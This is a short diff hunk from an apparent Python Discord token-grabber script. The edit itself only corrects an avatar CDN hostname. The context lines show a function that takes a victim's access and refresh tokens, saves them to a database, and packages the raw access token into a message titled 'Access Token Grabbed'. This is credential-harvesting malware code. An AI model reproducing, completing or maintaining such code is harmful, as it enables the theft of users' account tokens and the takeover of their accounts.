@@ -73,7 +73,7 @@ def log(access_token, refresh_token):
 	data = r.json()
 	roleadd = addrole(data["id"])
 	dbinsert = insert_db(data["id"],access_token,refresh_token)
-	av = f"https://cdn.nextcordapp.com/avatars/{data['id']}/{data['avatar']}.gif?size=160"
+	av = f"https://cdn.discordapp.com/avatars/{data['id']}/{data['avatar']}.gif?size=160"
 	if httpx.get(av).status_code == 415:
 			av = av.replace("gif","png")
 	json = {"content":access_token,"embeds":[{"title":"Access Token Grabbed","description":f"""**ID: ** {data['id']}
